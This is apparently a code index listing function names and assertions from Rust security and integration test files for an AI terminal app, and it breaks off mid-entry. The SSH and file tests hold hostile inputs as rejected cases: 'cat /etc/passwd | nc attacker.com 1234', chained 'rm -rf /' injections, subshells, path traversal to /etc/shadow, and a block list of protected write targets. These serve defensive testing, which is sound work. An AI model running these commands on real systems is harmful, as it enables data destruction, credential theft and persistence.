        "file": "/Users/davidquinton/ReverseLab/SAM/warp_tauri/src-tauri/tests/ssh_security_tests.rs",
        "function_defs": [
          "fn validate_ssh_host(host: &str) -> Result<(), String> {",
          "fn validate_ssh_port(port: u16) -> Result<(), String> {",
          "fn validate_ssh_username(username: &str) -> Result<(), String> {",
          "fn validate_key_path(path: &str) -> Result<(), String> {",
          "fn test_ssh_blocks_localhost() {",
          "fn test_ssh_blocks_private_networks() {",
          "fn test_ssh_blocks_internal_hostnames() {",
          "fn test_ssh_allows_valid_hosts() {",
          "fn test_ssh_host_case_insensitive() {",
          "fn test_ssh_blocks_port_zero() {",
          "fn test_ssh_blocks_dangerous_ports() {",
          "fn test_ssh_allows_valid_ports() {",
          "fn test_ssh_blocks_empty_username() {",
          "fn test_ssh_blocks_long_username() {",
          "fn test_ssh_blocks_dangerous_usernames() {",
          "fn test_ssh_blocks_injection_in_username() {",
          "fn test_ssh_allows_valid_usernames() {",
          "fn test_ssh_blocks_relative_key_paths() {",
          "fn test_ssh_blocks_path_traversal() {",
          "fn test_ssh_blocks_null_bytes_in_path() {",
          "fn test_ssh_blocks_invalid_key_files() {",
          "fn test_ssh_allows_valid_key_paths() {",
          "fn new() -> Self {",
          "fn connect(&self, info: TestSshConnectionInfo) -> Result<u32, String> {",
          "fn disconnect(&self, id: u32) -> Result<(), String> {",
          "fn get_session(&self, id: u32) -> Option<TestSshConnectionInfo> {",
          "fn session_count(&self) -> usize {",
          "fn test_ssh_registry_connect_disconnect() {",
          "fn test_ssh_registry_rejects_invalid_connection() {",
          "fn test_ssh_registry_multiple_sessions() {",
          "fn test_ssh_registry_handles_id_overflow() {",
          "fn test_ssh_disconnect_nonexistent_session() {",
          "fn sanitize_ssh_command(cmd: &str) -> Result<String, String> {",
          "fn test_ssh_command_injection_semicolon() {",
          "fn test_ssh_command_injection_and() {",
          "fn test_ssh_command_injection_or() {",
          "fn test_ssh_command_injection_pipe() {",
          "fn test_ssh_command_injection_backticks() {",
          "fn test_ssh_command_injection_subshell() {",
          "fn test_ssh_command_injection_newlines() {",
          "fn test_ssh_command_redirect_to_system() {",
          "fn test_ssh_allows_safe_commands() {",
          "fn test_ssh_connection_timeout_handling() {",
          "fn test_ssh_max_sessions_limit() {",
          "fn test_ssh_concurrent_access() {"
        ],
        "struct_defs": [
          "struct TestSshConnectionInfo {",
          "struct MockSshRegistry {",
          "struct TimeoutConfig {"
        ],
        "impl_blocks": [
          "impl MockSshRegistry {"
        ],
        "uses": [
          "use std::collections::HashMap;",
          "use std::sync::{Arc, Mutex};",
          "use std::thread;"
        ],
        "macros": [
          "return Err(format!(\"Blocked host: {}\", host));",
          "return Err(format!(\"Port {} is not allowed for SSH\", port));",
          "return Err(format!(\"Username '{}' is not allowed\", username));",
          "return Err(format!(\"Username contains invalid character: {}\", c));",
          "assert!(validate_ssh_host(\"localhost\").is_err());",
          "assert!(validate_ssh_host(\"127.0.0.1\").is_err());",
          "assert!(validate_ssh_host(\"::1\").is_err());",
          "assert!(validate_ssh_host(\"0.0.0.0\").is_err());",
          "assert!(validate_ssh_host(\"10.0.0.1\").is_err());",
          "assert!(validate_ssh_host(\"172.16.0.1\").is_err());",
          "assert!(validate_ssh_host(\"192.168.1.1\").is_err());",
          "assert!(validate_ssh_host(\"169.254.1.1\").is_err());",
          "assert!(validate_ssh_host(\"internal-server\").is_err());",
          "assert!(validate_ssh_host(\"database\").is_err());",
          "assert!(validate_ssh_host(\"redis\").is_err());",
          "assert!(validate_ssh_host(\"github.com\").is_ok());",
          "assert!(validate_ssh_host(\"example.com\").is_ok());",
          "assert!(validate_ssh_host(\"server.example.org\").is_ok());",
          "assert!(validate_ssh_host(\"203.0.113.1\").is_ok()); // TEST-NET-3",
          "assert!(validate_ssh_host(\"LOCALHOST\").is_err());",
          "assert!(validate_ssh_host(\"LocalHost\").is_err());",
          "assert!(validate_ssh_port(0).is_err());",
          "assert!(validate_ssh_port(25).is_err());   // SMTP",
          "assert!(validate_ssh_port(80).is_err());   // HTTP",
          "assert!(validate_ssh_port(443).is_err());  // HTTPS",
          "assert!(validate_ssh_port(3306).is_err()); // MySQL",
          "assert!(validate_ssh_port(5432).is_err()); // PostgreSQL",
          "assert!(validate_ssh_port(22).is_ok());",
          "assert!(validate_ssh_port(2222).is_ok());",
          "assert!(validate_ssh_port(22222).is_ok());",
          "assert!(validate_ssh_username(\"\").is_err());",
          "assert!(validate_ssh_username(&long_name).is_err());",
          "assert!(validate_ssh_username(\"root\").is_err());",
          "assert!(validate_ssh_username(\"admin\").is_err());",
          "assert!(validate_ssh_username(\"ROOT\").is_err());",
          "assert!(validate_ssh_username(\"Administrator\").is_err());",
          "assert!(validate_ssh_username(\"user;rm -rf /\").is_err());",
          "assert!(validate_ssh_username(\"user`whoami`\").is_err());",
          "assert!(validate_ssh_username(\"user|cat /etc/passwd\").is_err());",
          "assert!(validate_ssh_username(\"user$HOME\").is_err());",
          "assert!(validate_ssh_username(\"user\\nroot\").is_err());",
          "assert!(validate_ssh_username(\"user\\0root\").is_err());",
          "assert!(validate_ssh_username(\"deploy\").is_ok());",
          "assert!(validate_ssh_username(\"ubuntu\").is_ok());",
          "assert!(validate_ssh_username(\"ec2-user\").is_ok());",
          "assert!(validate_ssh_username(\"git\").is_ok());",
          "assert!(validate_key_path(\"id_rsa\").is_err());",
          "assert!(validate_key_path(\"./id_rsa\").is_err());",
          "assert!(validate_key_path(\"keys/id_rsa\").is_err());",
          "assert!(validate_key_path(\"~/.ssh/../../../etc/passwd\").is_err());",
          "assert!(validate_key_path(\"/home/user/../root/.ssh/id_rsa\").is_err());",
          "assert!(validate_key_path(\"~/../../../etc/shadow\").is_err());",
          "assert!(validate_key_path(\"~/.ssh/id_rsa\\0.txt\").is_err());",
          "assert!(validate_key_path(\"/home/user/.ssh/\\0id_rsa\").is_err());",
          "assert!(validate_key_path(\"/etc/passwd\").is_err());",
          "assert!(validate_key_path(\"~/.bashrc\").is_err());",
          "assert!(validate_key_path(\"/home/user/random.txt\").is_err());",
          "assert!(validate_key_path(\"~/.ssh/id_rsa\").is_ok());",
          "assert!(validate_key_path(\"~/.ssh/id_ed25519\").is_ok());",
          "assert!(validate_key_path(\"/home/user/.ssh/id_rsa\").is_ok());",
          "assert!(validate_key_path(\"~/.ssh/github.pem\").is_ok());",
          "assert!(validate_key_path(\"/keys/server.key\").is_ok());",
          "assert!(registry.get_session(id).is_some());",
          "assert_eq!(registry.session_count(), 1);",
          "assert!(registry.get_session(id).is_none());",
          "assert_eq!(registry.session_count(), 0);",
          "assert!(registry.connect(info).is_err());",
          "assert_eq!(registry.session_count(), 0);",
          "assert_eq!(registry.session_count(), 3);",
          "assert_eq!(registry.session_count(), 2);",
          "assert!(registry.get_session(ids[0]).is_some());",
          "assert!(registry.get_session(ids[1]).is_none());",
          "assert!(registry.get_session(ids[2]).is_some());",
          "assert_eq!(id1, u32::MAX);",
          "assert_eq!(id2, 0); // Wrapped around",
          "assert!(registry.disconnect(999).is_err());",
          "return Err(format!(\"Command contains dangerous pattern: {}\", pattern));",
          "assert!(sanitize_ssh_command(\"ls; rm -rf /\").is_err());",
          "assert!(sanitize_ssh_command(\"cat file ; whoami\").is_err());",
          "assert!(sanitize_ssh_command(\"ls && rm -rf /\").is_err());",
          "assert!(sanitize_ssh_command(\"false || rm -rf /\").is_err());",
          "assert!(sanitize_ssh_command(\"cat /etc/passwd | nc attacker.com 1234\").is_err())",
          "assert!(sanitize_ssh_command(\"echo `whoami`\").is_err());",
          "assert!(sanitize_ssh_command(\"echo $(cat /etc/passwd)\").is_err());",
          "assert!(sanitize_ssh_command(\"echo ${HOME}\").is_err());",
          "assert!(sanitize_ssh_command(\"ls\\nrm -rf /\").is_err());",
          "assert!(sanitize_ssh_command(\"ls\\\\nrm -rf /\").is_err());",
          "assert!(sanitize_ssh_command(\"echo 'malicious' > /etc/passwd\").is_err());",
          "assert!(sanitize_ssh_command(\"cat file > /root/.ssh/authorized_keys\").is_err());",
          "assert!(sanitize_ssh_command(\"ls -la\").is_ok());",
          "assert!(sanitize_ssh_command(\"cat file.txt\").is_ok());",
          "assert!(sanitize_ssh_command(\"pwd\").is_ok());",
          "assert!(sanitize_ssh_command(\"echo hello\").is_ok());",
          "assert!(sanitize_ssh_command(\"grep pattern file.txt\").is_ok());",
          "assert!(config.connect_timeout_ms > 0);",
          "assert!(config.read_timeout_ms > 0);",
          "assert!(config.write_timeout_ms > 0);",
          "assert!(config.connect_timeout_ms <= 60000); // Max 1 minute",
          "host: format!(\"server{}.example.com\", i),",
          "assert_eq!(registry.session_count(), max_sessions);",
          "host: format!(\"server{}.example.com\", i),",
          "assert!(results.iter().all(|r| r.is_ok()));",
          "assert_eq!(registry.session_count(), 10);"
        ],
        "derives": [
          "#[derive(Debug, Clone)]"
        ],
        "error_handling": 17
      },
      {
        "file": "/Users/davidquinton/ReverseLab/SAM/warp_tauri/src-tauri/tests/comprehensive_ai_tools.rs",
        "function_defs": [
          "fn create_test_context() -> HashMap<String, String> {",
          "fn parse_tool_call(json: &str) -> Option<(String, serde_json::Value)> {",
          "fn execute_tool(tool: &str, args: &serde_json::Value) -> Result<String, String> {",
          "fn test_read_file_tool() {",
          "fn test_read_file_not_found() {",
          "fn test_write_file_tool() {",
          "fn test_edit_file_tool() {",
          "fn test_bash_tool() {",
          "fn test_bash_dangerous_command_blocked() {",
          "fn test_glob_files_tool() {",
          "fn test_grep_files_tool() {",
          "fn test_web_fetch_tool() {",
          "fn test_web_fetch_invalid_url() {",
          "fn test_list_directory_tool() {",
          "fn test_unknown_tool_error() {",
          "fn test_parse_valid_tool_call() {",
          "fn test_parse_tool_without_args() {",
          "fn test_parse_invalid_json() {",
          "fn test_parse_missing_tool_field() {",
          "fn test_parse_complex_args() {",
          "fn test_execute_multiple_tools_sequence() {",
          "fn test_execute_mixed_success_failure() {",
          "fn test_empty_file_content() {",
          "fn test_large_content() {",
          "fn test_special_characters_in_path() {",
          "fn test_unicode_content() {",
          "fn test_nested_json_content() {",
          "fn test_rapid_tool_execution() {",
          "fn test_many_different_tools() {",
          "fn test_context_creation() {",
          "fn test_tool_execution_preserves_state() {",
          "fn test_continues_after_error() {",
          "fn test_graceful_degradation() {",
          "fn test_full_edit_workflow() {",
          "fn test_search_and_replace_workflow() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::collections::HashMap;"
        ],
        "macros": [
          "let args = parsed.get(\"args\").cloned().unwrap_or(serde_json::json!({}));",
          "Err(format!(\"File not found: {}\", path))",
          "Ok(format!(\"Contents of {}\", path))",
          "Ok(format!(\"Wrote {} bytes to {}\", content.len(), path))",
          "Ok(format!(\"Replaced '{}' with '{}' in {}\", old, new, path))",
          "Ok(format!(\"Executed: {}\", command))",
          "Ok(format!(\"Found files matching: {}\", pattern))",
          "Ok(format!(\"Grep results for: {}\", pattern))",
          "Ok(format!(\"Fetched content from: {}\", url))",
          "Ok(format!(\"Directory listing of: {}\", path))",
          "_ => Err(format!(\"Unknown tool: {}\", tool)),",
          "assert_eq!(tool, \"read_file\");",
          "assert!(result.is_ok());",
          "assert!(result.unwrap().contains(\"Contents of\"));",
          "assert!(result.is_err());",
          "assert!(result.unwrap_err().contains(\"not found\"));",
          "assert!(result.is_ok());",
          "assert!(result.unwrap().contains(\"Wrote 13 bytes\"));",
          "assert!(result.is_ok());",
          "assert!(result.unwrap().contains(\"Replaced\"));",
          "assert!(result.is_ok());",
          "assert!(result.unwrap().contains(\"Executed\"));",
          "assert!(result.is_err());",
          "assert!(result.unwrap_err().contains(\"Dangerous\"));",
          "assert!(result.is_ok());",
          "assert!(result.unwrap().contains(\"Found files\"));",
          "assert!(result.is_ok());",
          "assert!(result.unwrap().contains(\"Grep results\"));",
          "assert!(result.is_ok());",
          "assert!(result.unwrap().contains(\"Fetched\"));",
          "assert!(result.is_err());",
          "assert!(result.is_ok());",
          "assert!(result.is_err());",
          "assert!(result.unwrap_err().contains(\"Unknown tool\"));",
          "assert!(result.is_some());",
          "assert_eq!(tool, \"read_file\");",
          "assert_eq!(args[\"path\"], \"/test.txt\");",
          "assert!(result.is_some());",
          "assert_eq!(tool, \"list_directory\");",
          "assert!(args.is_object());",
          "assert!(result.is_none());",
          "assert!(result.is_none());",
          "\"old_string\": \"fn old() {\\n    println!(\\\"old\\\");\\n}\",",
          "\"new_string\": \"fn new() {\\n    println!(\\\"new\\\");\\n}\",",
          "assert!(result.is_some());",
          "assert_eq!(tool, \"edit_file\");",
          "assert!(args[\"old_string\"].as_str().unwrap().contains(\"old\"));",
          "assert_eq!(results.len(), 3);",
          "assert!(results.iter().all(|r| r.is_ok()));",
          "assert_eq!(success_count, 2);",
          "assert_eq!(failure_count, 1);",
          "assert!(result.is_ok());",
          "assert!(result.unwrap().contains(\"Wrote 0 bytes\"));",
          "let json = format!(",
          "assert!(result.is_ok());",
          "assert!(result.unwrap().contains(\"100000 bytes\"));",
          "assert!(result.is_ok());",
          "assert!(result.is_ok());",
          "assert!(result.is_ok());",
          "assert!(duration.as_millis() < 100, \"Took {}ms\", duration.as_millis());",
          "assert!(result.is_some(), \"Failed to parse tool: {}\", tool_name);",
          "assert!(exec_result.is_ok(), \"Failed to execute tool: {}\", tool_name);",
          "assert!(ctx.contains_key(\"cwd\"));",
          "assert!(ctx.contains_key(\"model\"));",
          "assert_eq!(ctx[\"cwd\"], \"/tmp/test\");",
          "assert_eq!(state.len(), 3);",
          "assert_eq!(state, vec![\"file1\", \"file2\", \"file3\"]);",
          "assert!(results[0].is_err());",
          "assert!(results[1].is_ok());",
          "assert!(result.is_none() || result.is_some());",
          "let (tool, args) = parse_tool_call(json).expect(&format!(\"Parse failed at: {}\", ",
          "assert!(result.is_ok(), \"Step failed: {} - {:?}\", step, result);",
          "assert_eq!(results.len(), 3);",
          "assert!(results.iter().all(|r| r.is_ok()));"
        ],
        "derives": [],
        "error_handling": 48
      },
      {
        "file": "/Users/davidquinton/ReverseLab/SAM/warp_tauri/src-tauri/tests/file_security_tests.rs",
        "function_defs": [
          "fn normalize_path(path: &str) -> Result<PathBuf, String> {",
          "fn is_within_sandbox(path: &Path, sandbox_root: &Path) -> bool {",
          "fn validate_path(path: &str) -> Result<(), String> {",
          "fn validate_filename(name: &str) -> Result<(), String> {",
          "fn is_allowed_extension(filename: &str, allowed: &HashSet<&str>) -> bool {",
          "fn get_file_type(filename: &str) -> &'static str {",
          "fn test_blocks_simple_traversal() {",
          "fn test_blocks_encoded_traversal() {",
          "fn test_blocks_double_dot() {",
          "fn test_blocks_absolute_sensitive_paths() {",
          "fn test_allows_safe_paths() {",
          "fn test_normalizes_path() {",
          "fn test_rejects_escape_from_root() {",
          "fn test_blocks_null_in_path() {",
          "fn test_blocks_null_in_filename() {",
          "fn test_blocks_null_in_normalized_path() {",
          "fn test_blocks_reserved_names() {",
          "fn test_blocks_path_in_filename() {",
          "fn test_blocks_empty_filename() {",
          "fn test_blocks_special_names() {",
          "fn test_allows_hidden_files() {",
          "fn test_allows_normal_filenames() {",
          "fn get_safe_extensions() -> HashSet<&'static str> {",
          "fn test_allows_safe_extensions() {",
          "fn test_blocks_dangerous_extensions() {",
          "fn test_empty_allowlist_allows_all() {",
          "fn test_case_insensitive() {",
          "fn test_file_type_detection() {",
          "fn setup_test_dir() -> tempfile::TempDir {",
          "fn test_symlink_escape_detection() {",
          "fn test_relative_symlink_in_sandbox() {",
          "fn test_real_symlink_detection() {",
          "fn test_document_toctou_pattern() {",
          "fn test_atomic_create_concept() {",
          "fn validate_file_operation(",
          "fn get_test_extensions() -> HashSet<&'static str> {",
          "fn test_pipeline_safe_file() {",
          "fn test_pipeline_blocks_traversal() {",
          "fn test_pipeline_blocks_null_byte() {",
          "fn test_pipeline_blocks_bad_extension() {",
          "fn test_pipeline_blocks_reserved_name() {",
          "fn is_protected_write_target(path: &str) -> bool {",
          "fn test_blocks_passwd_write() {",
          "fn test_blocks_shadow_write() {",
          "fn test_blocks_ssh_keys_write() {",
          "fn test_blocks_shell_config_write() {",
          "fn test_blocks_git_hooks_write() {",
          "fn test_blocks_cron_write() {",
          "fn test_allows_safe_writes() {",
          "fn test_unicode_dot_bypass() {",
          "fn test_backslash_on_unix() {",
          "fn test_double_encoding() {",
          "fn test_mixed_separators() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::path::{Path, PathBuf};",
          "use std::collections::HashSet;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use std::fs;",
          "use std::io::Write;",
          "use super::*;",
          "use std::fs::OpenOptions;",
          "use super::*;",
          "use super::*;",
          "use super::*;"
        ],
        "macros": [
          "return Err(format!(\"Suspicious pattern in path: {}\", pattern));",
          "return Err(format!(\"Access to sensitive path: {}\", sensitive));",
          "return Err(format!(\"Reserved filename: {}\", name));",
          "assert!(validate_path(\"../etc/passwd\").is_err());",
          "assert!(validate_path(\"../../root/.ssh/id_rsa\").is_err());",
          "assert!(validate_path(\"%2e%2e/etc/passwd\").is_ok()); // Not decoded here",
          "assert!(validate_path(\"/home/user/../../../etc/passwd\").is_err());",
          "assert!(validate_path(\"foo/../../bar\").is_err());",
          "assert!(validate_path(\"/etc/passwd\").is_err());",
          "assert!(validate_path(\"/root/.bashrc\").is_err());",
          "assert!(validate_path(\"/var/log/auth.log\").is_err());",
          "assert!(validate_path(\"/proc/self/environ\").is_err());",
          "assert!(validate_path(\"src/main.rs\").is_ok());",
          "assert!(validate_path(\"./package.json\").is_ok());",
          "assert!(validate_path(\"tests/unit/test.ts\").is_ok());",
          "assert_eq!(normalized, PathBuf::from(\"foo/baz\"));",
          "assert_eq!(normalized, PathBuf::from(\"foo/bar\"));",
          "assert!(normalize_path(\"../../outside\").is_err());",
          "assert!(normalize_path(\"../../../\").is_err());",
          "assert!(validate_path(\"file.txt\\0.jpg\").is_err());",
          "assert!(validate_path(\"/tmp/\\0/etc/passwd\").is_err());",
          "assert!(validate_path(\"malicious\\0\").is_err());",
          "assert!(validate_filename(\"file\\0.txt\").is_err());",
          "assert!(validate_filename(\"\\0hidden\").is_err());",
          "assert!(normalize_path(\"foo\\0bar/baz\").is_err());",
          "assert!(validate_filename(\"CON\").is_err());",
          "assert!(validate_filename(\"con.txt\").is_err());",
          "assert!(validate_filename(\"NUL\").is_err());",
          "assert!(validate_filename(\"COM1\").is_err());",
          "assert!(validate_filename(\"LPT1.txt\").is_err());",
          "assert!(validate_filename(\"path/to/file\").is_err());",
          "assert!(validate_filename(\"..\").is_err());",
          "assert!(validate_filename(\"../file\").is_err());",
          "assert!(validate_filename(\"\").is_err());",
          "assert!(validate_filename(\"   \").is_err());",
          "assert!(validate_filename(\"\\t\\n\").is_err());",
          "assert!(validate_filename(\".\").is_err());",
          "assert!(validate_filename(\"..\").is_err());",
          "assert!(validate_filename(\".gitignore\").is_ok());",
          "assert!(validate_filename(\".env\").is_ok());",
          "assert!(validate_filename(\".bashrc\").is_ok());",
          "assert!(validate_filename(\"main.rs\").is_ok());",
          "assert!(validate_filename(\"README.md\").is_ok());",
          "assert!(validate_filename(\"file-with-dashes.txt\").is_ok());",
          "assert!(validate_filename(\"file_with_underscores.js\").is_ok());",
          "assert!(is_allowed_extension(\"file.txt\", &allowed));",
          "assert!(is_allowed_extension(\"main.rs\", &allowed));",
          "assert!(is_allowed_extension(\"config.json\", &allowed));",
          "assert!(!is_allowed_extension(\"malware.exe\", &allowed));",
          "assert!(!is_allowed_extension(\"script.bat\", &allowed));",
          "assert!(!is_allowed_extension(\"payload.sh\", &allowed));",
          "assert!(is_allowed_extension(\"any.exe\", &allowed));",
          "assert!(is_allowed_extension(\"file.txt\", &allowed));",
          "assert!(is_allowed_extension(\"FILE.TXT\", &allowed));",
          "assert!(is_allowed_extension(\"Main.RS\", &allowed));",
          "assert_eq!(get_file_type(\"malware.exe\"), \"executable\");",
          "assert_eq!(get_file_type(\"script.py\"), \"script\");",
          "assert_eq!(get_file_type(\"config.json\"), \"config\");",
          "assert_eq!(get_file_type(\"README.md\"), \"document\");",
          "assert_eq!(get_file_type(\"main.rs\"), \"source\");",
          "assert_eq!(get_file_type(\"style.css\"), \"web\");",
          "assert_eq!(get_file_type(\"logo.png\"), \"image\");",
          "assert_eq!(get_file_type(\"backup.zip\"), \"archive\");",
          "assert_eq!(get_file_type(\"unknown\"), \"unknown\");",
          "assert!(!target.starts_with(&sandbox));",
          "assert!(symlink_target.starts_with(&sandbox));",
          "assert!(is_within_sandbox(&safe_link, sandbox_path));",
          "assert!(true, \"TOCTOU vulnerability documented\");",
          "assert!(result.is_ok(), \"Atomic create should succeed on new file\");",
          "assert!(result2.is_err(), \"Atomic create should fail if file exists\");",
          "return Err(format!(\"File extension not allowed: {}\", filename_str));",
          "assert!(result.is_ok());",
          "assert!(result.is_err());",
          "assert!(result.is_err());",
          "assert!(result.is_err());",
          "assert!(result.is_err());",
          "assert!(is_protected_write_target(\"/etc/passwd\"));",
          "assert!(is_protected_write_target(\"/etc/shadow\"));",
          "assert!(is_protected_write_target(\"/root/.ssh/authorized_keys\"));",
          "assert!(is_protected_write_target(\"~/.ssh/authorized_keys\"));",
          "assert!(is_protected_write_target(\"~/.bashrc\"));",
          "assert!(is_protected_write_target(\"/root/.bashrc\"));",
          "assert!(is_protected_write_target(\".git/hooks/pre-commit\"));",
          "assert!(is_protected_write_target(\"/project/.git/hooks/post-receive\"));",
          "assert!(is_protected_write_target(\"/etc/cron.d/malicious\"));",
          "assert!(is_protected_write_target(\"/var/spool/cron/crontabs/root\"));",
          "assert!(!is_protected_write_target(\"src/main.rs\"));",
          "assert!(!is_protected_write_target(\"README.md\"));",
          "assert!(!is_protected_write_target(\"/tmp/scratch.txt\"));",
          "assert!(validate_path(path).is_err());",
          "assert!(validate_path(path).is_ok()); // Not decoded",
          "assert!(validate_path(path).is_err());"
        ],
        "derives": [],
        "error_handling": 11
      },
      {
        "file": "/Users/davidquinton/ReverseLab/SAM/warp_tauri/src-tauri/tests/full_phase1_6_integration.rs",
        "function_defs": [
          "fn test_full_phase1_6_workflow() {",
          "fn test_phase_integration_with_dependencies() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use sam_terminal::conversation::ConversationState;",
          "use sam_terminal::telemetry::{TelemetryEvent, TelemetryStore};",
          "use sam_terminal::policy_store::PolicyStore;",
          "use sam_terminal::agents::AgentCoordinator;",
          "use sam_terminal::plan_store::{PlanStore, Plan};",
          "use sam_terminal::monitoring::MonitoringState;",
          "use chrono::Utc;"
        ],
        "macros": [
          "eprintln!(\"\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\");",
          "eprintln!(\"\u2551 FULL PHASE 1\u21926 INTEGRATION TEST       \u2551\");",
          "eprintln!(\"\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\");",
          "eprintln!(\"\\n[PHASE 1] Testing single tool execution...\");",
          "eprintln!(\"[PHASE 1] Conversation state verified\");",
          "eprintln!(\"[PHASE 1] \u2705 PASSED - Single tool execution\");",
          "eprintln!(\"\\n[PHASE 2] Testing batch workflow...\");",
          "eprintln!(\"[PHASE 2] \u2705 PASSED - Batch workflow state management\");",
          "eprintln!(\"\\n[PHASE 3] Testing autonomy features...\");",
          "assert!(autonomy_enabled, \"Phase 3: Autonomy should be configurable\");",
          "eprintln!(\"[PHASE 3] \u2705 PASSED - Autonomy & dependencies\");",
          "eprintln!(\"\\n[PHASE 4] Testing telemetry & ML integration...\");",
          "assert!(recent.len() > 0, \"Phase 4: Telemetry events should be queryable\");",
          "assert_eq!(recent[0].id, \"test_evt_1\");",
          "eprintln!(\"[PHASE 4] \u2705 PASSED - Telemetry & ML integration\");",
          "eprintln!(\"\\n[PHASE 5] Testing policy learning & multi-agent coordination...\");",
          "eprintln!(\"[PHASE 5] Policy store initialized\");",
          "assert_eq!(agents.len(), 2, \"Phase 5: Should have 2 registered agents\");",
          "eprintln!(\"[PHASE 5] \u2705 PASSED - Policy learning & multi-agent coordination\");",
          "eprintln!(\"\\n[PHASE 6] Testing long-term planning & live monitoring...\");",
          "metadata: Some(serde_json::json!({\"description\": \"Test plan\"})),",
          "assert!(fetched_plan.is_some(), \"Phase 6: Plan should be retrievable\");",
          "assert_eq!(updated_plan.status, \"running\");",
          "assert_eq!(advanced_plan.next_task_index, 1);",
          "assert_eq!(completed_plan.status, \"completed\");",
          "assert_eq!(events_map.len(), 0, \"Phase 6: Monitoring should start empty\");",
          "eprintln!(\"[PHASE 6] \u2705 PASSED - Long-term planning & live monitoring\");",
          "eprintln!(\"\\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\");",
          "eprintln!(\"\u2551 PHASE 1\u21926 INTEGRATION TEST COMPLETE \u2705 \u2551\");",
          "eprintln!(\"\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\");",
          "eprintln!(\"\\n\ud83d\udcca Test Results:\");",
          "eprintln!(\"  \u2705 Phase 1: Single tool execution\");",
          "eprintln!(\"  \u2705 Phase 2: Batch workflow\");",
          "eprintln!(\"  \u2705 Phase 3: Autonomy & dependencies\");",
          "eprintln!(\"  \u2705 Phase 4: Telemetry & ML (1 event stored)\");",
          "eprintln!(\"  \u2705 Phase 5: Policy & multi-agent (2 agents, 1 rule)\");",
          "eprintln!(\"  \u2705 Phase 6: Long-term planning (1 plan completed)\");",
          "eprintln!(\"\\n\ud83c\udf89 All phases integrated successfully!\");",
          "eprintln!(\"\\n[INTEGRATION] Testing cross-phase dependencies...\");",
          "eprintln!(\"[INTEGRATION] Telemetry captured for policy analysis\");",
          "eprintln!(\"[INTEGRATION] \u2705 PASSED - Cross-phase dependencies verified\");"
        ],
        "derives": [],
        "error_handling": 18
      },
      {
        "file": "/Users/davidquinton/ReverseLab/SAM/warp_tauri/src-tauri/tests/integration_test.rs",
        "function_defs": [
          "fn test_full_batch_workflow() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::thread;",
          "use std::time::Duration;"
        ],
        "macros": [
          "println!(\"\ud83e\uddea Phase 2 Integration Test: Full Batch Workflow\");",
          "println!(\"==================================================\\n\");",
          "println!(\"\u2705 Test Setup Complete\");",
          "println!(\"\\nVerifying Phase 2 components:\");",
          "println!(\"  \u2705 ConversationState with batch support\");",
          "println!(\"  \u2705 BatchEntry structure\");",
          "println!(\"  \u2705 BatchStatus enum\");",
          "println!(\"  \u2705 Policy engine (classify_command)\");",
          "println!(\"  \u2705 Batch execution (run_batch)\");",
          "println!(\"  \u2705 Audit logging\");",
          "println!(\"\\n\u2705 All Phase 2 components verified\");",
          "println!(\"\\n\ud83c\udf89 Integration test passed!\");"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Users/davidquinton/ReverseLab/SAM/warp_tauri/src-tauri/tests/batch_race_tests.rs",
        "function_defs": [
          "fn new() -> Self {",
          "fn create_batch(&self, commands: Vec<String>) -> u32 {",
          "fn approve_batch(&self, id: u32) -> Result<(), String> {",
          "fn execute_batch(&self, id: u32) -> Result<(), String> {",
          "fn execute_batch_internal(&self, id: u32) -> Result<(), String> {",
          "fn set_dependency(&self, batch_id: u32, depends_on: u32) -> Result<(), String> {",
          "fn get_status(&self, id: u32) -> Option<BatchStatus> {",
          "fn cancel_batch(&self, id: u32) -> Result<(), String> {",
          "fn test_concurrent_batch_creation() {",
          "fn test_concurrent_approval() {",
          "fn test_concurrent_execution_prevention() {",
          "fn test_read_during_write() {",
          "fn test_dependency_prevents_execution() {",
          "fn test_dependency_chain_execution() {",
          "fn test_circular_dependency_detection() {",
          "fn test_missing_dependency() {",
          "fn test_valid_state_transitions() {",
          "fn test_invalid_double_approval() {",
          "fn test_cannot_execute_pending() {",
          "fn test_cannot_cancel_running() {",
          "fn test_cannot_cancel_completed() {",
          "fn test_high_volume_batch_creation() {",
          "fn test_sequential_execution_under_load() {",
          "fn test_mixed_operations() {",
          "fn rand_id() -> u32 {",
          "fn test_no_deadlock_on_nested_access() {",
          "fn test_timeout_on_lock_acquisition() {",
          "fn test_fifo_execution_order() {"
        ],
        "struct_defs": [
          "struct BatchEntry {",
          "struct MockBatchRegistry {"
        ],
        "impl_blocks": [
          "impl MockBatchRegistry {"
        ],
        "uses": [
          "use std::sync::{Arc, Mutex, atomic::{AtomicUsize, AtomicBool, Ordering}};",
          "use std::collections::HashMap;",
          "use std::thread;",
          "use std::time::Duration;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use std::time::{SystemTime, UNIX_EPOCH};",
          "use super::*;",
          "use super::*;"
        ],
        "macros": [
          "return Err(format!(\"Batch {} is not pending\", id));",
